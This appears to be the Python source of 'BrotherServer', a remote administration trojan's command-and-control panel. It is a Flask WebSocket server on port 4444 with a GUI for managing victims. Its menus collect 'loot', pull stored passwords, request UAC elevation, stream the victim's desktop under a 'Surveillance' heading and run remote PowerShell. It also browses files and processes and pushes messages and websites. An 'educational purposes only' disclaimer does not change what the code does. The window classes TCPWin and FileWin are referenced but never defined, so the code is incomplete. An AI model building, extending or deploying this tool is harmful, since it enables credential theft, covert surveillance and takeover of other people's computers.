# BrotherServer - A Remote Administration Tool (RAT) for Windows
# Author: Riverside1114
# This tool is for educational purposes only. Unauthorized use is prohibited.
# Version: 1.0 | Date: 2026.03.6 | GitHub: Riverside1114


import threading, os, base64, io, datetime
from flask import Flask
from flask_sock import Sock
import customtkinter as ctk
from tkinter import ttk, Menu, Toplevel, messagebox
from PIL import Image, ImageTk

app = Flask(__name__)
sock = Sock(app)
gui = None

if not os.path.exists("loot"): os.makedirs("loot")

class BrotherServer(ctk.CTk):
    def __init__(self):
        super().__init__()
        
        self.title("BrotherServer v1.0 - Private Access")
        self.geometry("1400x800")
        
        
        ctk.set_appearance_mode("light")
        ctk.set_default_color_theme("blue")
        
        self.icons = {}
        self.load_icons()
        self.clients = {}
        self.task_mgrs = {}
        self.tcp_views = {}
        self.rd_wins = {}
        self.sh_wins = {}
        self.file_wins = {}

        
        self.sidebar = ctk.CTkFrame(self, width=240, corner_radius=0, fg_color="#1a1a1a")
        self.sidebar.pack(side="left", fill="y")
        
        ctk.CTkLabel(self.sidebar, text="BROTHER SERVER", font=("Segoe UI", 22, "bold"), text_color="#3b8ed0").pack(pady=30)
        
        
        self.stats_frame = ctk.CTkFrame(self.sidebar, fg_color="transparent")
        self.stats_frame.pack(fill="x", padx=20)
        self.client_count_lbl = ctk.CTkLabel(self.stats_frame, text="Clients Online: 0", font=("Segoe UI", 14))
        self.client_count_lbl.pack(anchor="w")

      
        self.main_container = ctk.CTkFrame(self, corner_radius=15, fg_color="#A39797")
        self.main_container.pack(side="right", fill="both", expand=True, padx=20, pady=20)
        
        
        self.style = ttk.Style()
        self.style.theme_use("default")
        self.style.configure("Treeview", 
            background="#8B8989", 
            foreground="white", 
            fieldbackground="#242424", 
            rowheight=40,
            borderwidth=0,
            font=("Segoe UI", 11))
        self.style.map("Treeview", background=[('selected', '#3b8ed0')])
        self.style.configure("Treeview.Heading", background="#1a1a1a", foreground="white", borderwidth=0, font=("Segoe UI", 12, "bold"))

        self.tree = ttk.Treeview(self.main_container, columns=("ID", "User", "OS", "Status"), show="headings")
        for col in ("ID", "User", "OS", "Status"):
            self.tree.heading(col, text=col)
            self.tree.column(col, width=150, anchor="center")
        self.tree.pack(fill="both", expand=True, padx=5, pady=5)

        self.menu = Menu(self, tearoff=0, bg="#1a1a1a", fg="white", activebackground="#3b8ed0", font=("Segoe UI", 10))
        
        adm = Menu(self.menu, tearoff=0, bg="#1a1a1a", fg="white", activebackground="#3b8ed0")
        adm.add_command(label=" File Manager", command=self.open_filemgr)
        adm.add_command(label=" Processes", command=self.open_taskmgr)
        adm.add_command(label=" Network (TCP)", command=self.open_tcpview)
        adm.add_separator()
        adm.add_command(label=" Pull passwords", command=lambda: self.send_cmd("!passwords"))
        adm.add_command(label=" Admin-Privileges (UAC)", command=lambda: self.send_cmd("!elevate"))
        self.menu.add_cascade(label=" Control", menu=adm)

        
        sur = Menu(self.menu, tearoff=0, bg="#1a1a1a", fg="white")
        sur.add_command(label=" Remote Desktop", command=self.open_rd)
        sur.add_command(label=" Terminal (PS)", command=self.open_shell)
        self.menu.add_cascade(label=" Surveillance", menu=sur)

        
        inter = Menu(self.menu, tearoff=0, bg="#1a1a1a", fg="white")
        inter.add_command(label=" Send Message", command=self.input_msg)
        inter.add_command(label=" Open Website", command=self.input_web)
        self.menu.add_cascade(label=" Interaction", menu=inter)
        
        self.tree.bind("<Button-3>", lambda e: self.menu.post(e.x_root, e.y_root) if self.tree.identify_row(e.y) else None)

    def load_icons(self):
        
        icon_names = ["shell", "screen", "system", "folder", "key", "tasks", "network", "admin", "eye", "message", "web", "inject", "hand"]
        for n in icon_names:
            path = f"icons/{n}.ico"
            if os.path.exists(path):
                self.icons[n] = ImageTk.PhotoImage(Image.open(path).resize((18,18), Image.Resampling.LANCZOS))
            else: self.icons[n] = ""

    def send_cmd(self, cmd):
        try:
            cid = self.tree.selection()[0]
            if cid in self.clients: self.clients[cid].send(cmd)
        except: pass

    def update_stats(self):
        self.client_count_lbl.configure(text=f"Clients Online: {len(self.clients)}")

    def input_msg(self):
        d = ctk.CTkInputDialog(text="Nachricht eingeben:", title="MsgBox").get_input()
        if d: self.send_cmd(f"!msg {d}")

    def input_web(self):
        d = ctk.CTkInputDialog(text="URL eingeben:", title="Web").get_input()
        if d: self.send_cmd(f"!web {d}")

    def open_taskmgr(self): 
        try:
            cid = self.tree.selection()[0]
            self.task_mgrs[cid] = TaskWin(self, cid)
            self.send_cmd("!taskmgr")
        except: pass

    def open_tcpview(self): 
        try:
            cid = self.tree.selection()[0]
            self.tcp_views[cid] = TCPWin(self, cid)
            self.send_cmd("!tcp")
        except: pass

    def open_filemgr(self): 
        try:
            cid = self.tree.selection()[0]
            self.file_wins[cid] = FileWin(self, cid)
            self.send_cmd("!ls C:\\")
        except: pass

    def open_rd(self): 
        try:
            cid = self.tree.selection()[0]
            self.send_cmd("!start_rd")
            self.rd_wins[cid] = RDWin(self, cid)
        except: pass

    def open_shell(self): 
        try:
            cid = self.tree.selection()[0]
            self.sh_wins[cid] = ShWin(self, cid)
        except: pass



class TaskWin(Toplevel):
    def __init__(self, master, cid):
        super().__init__(master)
        self.title(f"Tasks: {cid}")
        self.geometry("500x600")
        self.configure(bg="#242424")
        self.tree = ttk.Treeview(self, columns=("Name", "PID"), show="headings")
        self.tree.heading("Name", text="Prozess")
        self.tree.heading("PID", text="PID")
        self.tree.pack(fill="both", expand=True, padx=10, pady=10)
    def update(self, data):
        self.tree.delete(*self.tree.get_children())
        for d in data.split(";"):
            if "|" in d: self.tree.insert("", "end", values=d.split("|"))

class ShWin(Toplevel):
    def __init__(self, m, cid):
        super().__init__(m)
        self.title(f"Terminal: {cid}")
        self.geometry("800x500")
        self.txt = ctk.CTkTextbox(self, fg_color="#000000", text_color="#00FF00", font=("Consolas", 12))
        self.txt.pack(fill="both", expand=True, padx=5, pady=5)
        self.ent = ctk.CTkEntry(self, placeholder_text="Befehl eingeben...", fg_color="#1a1a1a")
        self.ent.pack(fill="x", padx=5, pady=5)
        self.ent.bind("<Return>", lambda e: [gui.send_cmd("!ps "+self.ent.get()), self.ent.delete(0,'end')])
    def add(self, t): 
        self.txt.insert("end", t + "\n")
        self.txt.see("end")

class RDWin(Toplevel):
    def __init__(self, m, cid):
        super().__init__(m)
        self.title(f"Desktop: {cid}")
        self.lbl = ctk.CTkLabel(self, text="Wait for Stream...")
        self.lbl.pack(fill="both", expand=True)
        self.protocol("WM_DELETE_WINDOW", lambda: [gui.send_cmd("!stop_rd"), self.destroy()])
    def update(self, b64):
        img_data = base64.b64decode(b64)
        img = ImageTk.PhotoImage(Image.open(io.BytesIO(img_data)).resize((1100, 650)))
        self.lbl.configure(image=img, text="")
        self.lbl.image = img



@sock.route('/')
def handle_ws(ws):
    global gui
    cid = "Unknown"
    try:
        raw = ws.receive()
        if not raw: return
        data = raw.split('|')
        cid = f"{data[1]}@{data[0]}"
        gui.clients[cid] = ws
        gui.tree.insert("", "end", iid=cid, values=(cid, data[1], data[2], "ONLINE"))
        gui.update_stats()
        
        while True:
            msg = ws.receive()
            if not msg: break
            
            if msg.startswith("RD_FRAME:"):
                if cid in gui.rd_wins: gui.rd_wins[cid].update(msg.split("RD_FRAME:")[1])
            elif msg.startswith("TASKS:"):
                if cid in gui.task_mgrs: gui.task_mgrs[cid].update(msg.split("TASKS:")[1])
            elif msg.startswith("PS_OUTPUT:"):
                if cid in gui.sh_wins: gui.sh_wins[cid].add(msg.split("PS_OUTPUT:")[1])
            
            
    except: pass
    if cid in gui.clients: del gui.clients[cid]
    try: 
        gui.tree.delete(cid)
        gui.update_stats()
    except: pass

if __name__ == "__main__":
    gui = BrotherServer()
    threading.Thread(target=lambda: app.run(port=4444, host='0.0.0.0'), daemon=True).start()
    gui.mainloop()